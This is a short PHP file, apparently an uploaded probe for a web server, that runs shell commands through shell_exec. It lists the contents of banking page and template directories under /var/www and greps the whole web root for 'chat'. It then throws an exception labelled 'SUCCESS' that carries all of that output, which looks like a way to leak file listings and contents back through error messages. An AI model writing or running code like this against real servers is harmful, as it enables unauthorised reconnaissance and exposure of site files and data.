<?php
$output ='';
$output =$output."\n /var/www/pages/banking/... ".shell_exec ('ls /var/www/pages/banking/ | xargs');
$output =$output."\n /var/www/templates/banking/banking/... ".shell_exec ('ls /var/www/templates/banking/ | xargs');
$output =$output."\n grep chat in /var/www ... ".shell_exec ('grep -r "chat" /var/www/ | xargs');


throw new Exception("\n SUCCESS  ". $output."\n");
?>
